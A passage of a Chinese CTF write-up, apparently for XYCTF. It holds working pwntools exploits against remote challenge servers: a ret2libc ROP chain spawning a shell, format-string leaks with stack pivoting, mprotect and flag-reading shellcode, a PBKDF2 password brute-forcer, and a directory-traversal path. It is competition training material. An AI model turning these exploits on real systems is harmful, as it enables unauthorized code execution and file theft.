class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\nd<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">**</span><span class=\"token number\">4</span><span class=\"token operator\">-</span>q<span class=\"token operator\">**</span><span class=\"token number\">3</span><span class=\"token operator\">-</span>q<span class=\"token operator\">**</span><span class=\"token number\">2</span><span class=\"token operator\">+</span>q<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\nm<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> m<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span>\n\n\n</code></pre>\n\n<p>flag{Quaternion_15_ComComComComplexXXX!!!?}</p>\n<h2 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h2><h3 id=\"Ret2libc’s-Revenge\"><a href=\"#Ret2libc’s-Revenge\" class=\"headerlink\" title=\"Ret2libc’s Revenge\"></a>Ret2libc’s Revenge</h3><p>溢出可以写负数来改返回地址，之后ret2libc就行</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"DEBUG\"</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#io=process(\"./chal\")</span>\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"47.93.96.189\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">36879</span><span class=\"token punctuation\">)</span>\n\nr <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nrl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>    a<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nru <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>    <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsa <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nshell <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#debug(\"break *0x40127A\")</span>\n<span class=\"token comment\">#debug()</span>\n\n<span class=\"token comment\">#target=0x404000-0x20</span>\ntarget<span class=\"token operator\">=</span><span class=\"token number\">0x4005b0</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token operator\">-</span><span class=\"token number\">0x20</span>\nrbp<span class=\"token operator\">=</span><span class=\"token number\">0x040117d</span>\nrsi_0<span class=\"token operator\">=</span><span class=\"token number\">0x00000000004010e4</span>\nadd_rsi<span class=\"token operator\">=</span><span class=\"token number\">0x04010eb</span>\nputs<span class=\"token operator\">=</span><span class=\"token number\">0x404018</span>\nrdi_rsi<span class=\"token operator\">=</span><span class=\"token number\">0x0401180</span>\nplt<span class=\"token operator\">=</span><span class=\"token number\">0x0401070</span>\nmain<span class=\"token operator\">=</span><span class=\"token number\">0x40127B</span>\nret<span class=\"token operator\">=</span><span class=\"token number\">0x00000000004012a9</span>\n\nnum<span class=\"token operator\">=</span><span class=\"token number\">0xffffffff</span><span class=\"token operator\">-</span><span class=\"token number\">0x12</span><span class=\"token operator\">-</span><span class=\"token number\">0xc8</span>\np<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">528</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsi_0<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>add_rsi<span class=\"token punctuation\">)</span>\np<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdi_rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tsl<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n\nlibc<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x7f\"</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x21b780</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span>\n\n\nrsi<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x2be51</span>\nrsi_rdx<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x118f2f</span>\nrdi<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x2a3e5</span>\n\nbinsh<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x1d8678</span>\nsystem<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0xeb080</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span>\n\np<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">528</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4040a0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsi_rdx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span>\nsl<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\nshell<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n\n\n<h3 id=\"web苦手\"><a href=\"#web苦手\" class=\"headerlink\" title=\"web苦手\"></a>web苦手</h3><p>两个密码生成的密钥只要最高位为00就可以绕过检测</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> hashlib\n<span class=\"token keyword\">import</span> itertools\n<span class=\"token keyword\">import</span> string\n\nsalt <span class=\"token operator\">=</span> <span class=\"token string\">b\"XYCTF\"</span>\niterations <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\ndklen <span class=\"token operator\">=</span> <span class=\"token number\">32</span>\n\ncharset <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits  <span class=\"token comment\"># a-zA-Z0-9</span>\n\n<span class=\"token keyword\">for</span> length <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">67</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> candidate <span class=\"token keyword\">in</span> itertools<span class=\"token punctuation\">.</span>product<span class=\"token punctuation\">(</span>charset<span class=\"token punctuation\">,</span> repeat<span class=\"token operator\">=</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        password <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>candidate<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        key <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>pbkdf2_hmac<span class=\"token punctuation\">(</span><span class=\"token string\">\"sha1\"</span><span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">,</span> salt<span class=\"token punctuation\">,</span> iterations<span class=\"token punctuation\">,</span> dklen<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found password:\"</span><span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span>errors<span class=\"token operator\">=</span><span class=\"token string\">\"ignore\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#J</span>\n<span class=\"token comment\">#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae2</span>\n</code></pre>\n\n<p>用这两个密码登陆之后目录穿越拿到真的flag</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token operator\">//</span>flag</code></pre>\n\n<h3 id=\"girlfriend\"><a href=\"#girlfriend\" class=\"headerlink\" title=\"girlfriend\"></a>girlfriend</h3><p>栈迁移打mprotect，之后用openat, mmap, write 读flag</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"DEBUG\"</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#io=process(\"./chal\")</span>\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"47.94.15.198\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34840</span><span class=\"token punctuation\">)</span>\n\nr <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nrl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>    a<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nru <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>    <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsa <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nshell <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">)</span>\n\n\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\np<span class=\"token operator\">=</span><span class=\"token string\">\"%7$p-%15$p-%3$p\"</span>\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\"first\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">\"name:\\n\"</span><span class=\"token punctuation\">)</span>\nleak<span class=\"token operator\">=</span>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"Y\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">)</span>\ncanary<span class=\"token operator\">=</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\npie<span class=\"token operator\">=</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x18d9</span>\nlibc<span class=\"token operator\">=</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x114887</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>pie<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span>\n\nread<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x1147d0</span>\nret<span class=\"token operator\">=</span>pie<span class=\"token operator\">+</span><span class=\"token number\">0x0157B</span>\nrdi<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x2a3e5</span>\nrax<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x45eb0</span>\nrsi<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x02be51</span>\nr12<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x35731</span>\nrdx_r12_r13<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0xa80c8</span>\nmprotect<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x11eaa0</span>\ncall<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x29d8e</span>\n\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\n\nrop<span class=\"token operator\">=</span><span class=\"token string\">\"X\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">=</span>rop<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"X\"</span><span class=\"token punctuation\">)</span>\n\nsc<span class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span><span class=\"token triple-quoted-string string\">\"\"\"\nmovabs rax, 0x67616C66\npush 0\npush rax\npush rsp\nmov rdi, -100\npop rsi\nxor rdx, rdx\nxor r10, r10\nmov rax, 0x101\nsyscall #openat(AT_FDCWD, \"flag.txt\", 0, 0);\n\nmov rdi, 0x1337000\nmov rsi, 0x1000\nmov rdx, 1\nmov r10, 1\nmov r8, rax\nxor r9, r9\nmov rax, 0x9\nsyscall #mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);\n\nmov rdi, 1\nmov rsi, 0x1337000\nmov rdx, 0x100\nmov rax, 1\nsyscall\n\"\"\"</span><span class=\"token punctuation\">)</span>\n\nrop<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pie<span class=\"token operator\">+</span><span class=\"token number\">0x4000</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x2000</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdx_r12_r13<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdx_r12_r13<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>mprotect<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#rop+=p64(rdi)+p64(0)</span>\n<span class=\"token comment\">#rop+=p64(rsi)+p64(pie+0x4000+0x1000)</span>\n<span class=\"token comment\">#rop+=p64(r12)+p64(0x100)</span>\n<span class=\"token comment\">#rop+=p64(rdx_r12_r13)+p64(0)*2</span>\n<span class=\"token comment\">#rop+=p64(read)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rax<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pie<span class=\"token operator\">+</span><span class=\"token number\">0x40d0</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>call<span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>sc\n\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">)</span>\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\"first\"</span><span class=\"token punctuation\">,</span> rop<span class=\"token punctuation\">)</span>\n\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Choice:\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\np<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">56</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pie<span class=\"token operator\">+</span><span class=\"token number\">0x04060</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pie<span class=\"token operator\">+</span><span class=\"token number\">0x1676</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#p=\"A\"*56+p64(canary)+\"A\"*8+p64(pie+0x1220)</span>\n<span class=\"token comment\">#debug()</span>\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\"?\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n\n\nsc<span class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span><span class=\"token triple-quoted-string string\">\"\"\"\nmovabs rax, 0x67616C66\npush 0\npush rax\npush rsp\nmov rdi, -100\npop rsi\nxor rdx, rdx\nxor r10, r10\nmov rax, 0x101\nsyscall #openat(AT_FDCWD, \"flag\", 0, 0);\n\nmov rdi, 0x1337000\nmov rsi, 0x1000\nmov rdx, 1\nmov r10, 1\nmov r8, rax\nxor r9, r9\nmov rax, 0x9\nsyscall #mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);\n\nmov rdi, 1\nmov rsi, 0x1337000\nmov rdx, 0x100\nmov rax, 1\nsyscall\n\"\"\"</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token comment\">#debug()</span>\nshell<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n\n\n<h3 id=\"明日方舟寻访模拟器\"><a href=\"#明日方舟寻访模拟器\" class=\"headerlink\" title=\"明日方舟寻访模拟器\"></a>明日方舟寻访模拟器</h3><p>让count变成sh之后传给system，因为输出被关所以把输出道到stderr</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"INFO\"</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#io=process(\"./chal\")</span>\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"47.94.172.18\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">28754</span><span class=\"token punctuation\">)</span>\n\nr <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nrl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>    a<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nru <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>    <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsl <span class=\"token operator\">=</span> <span 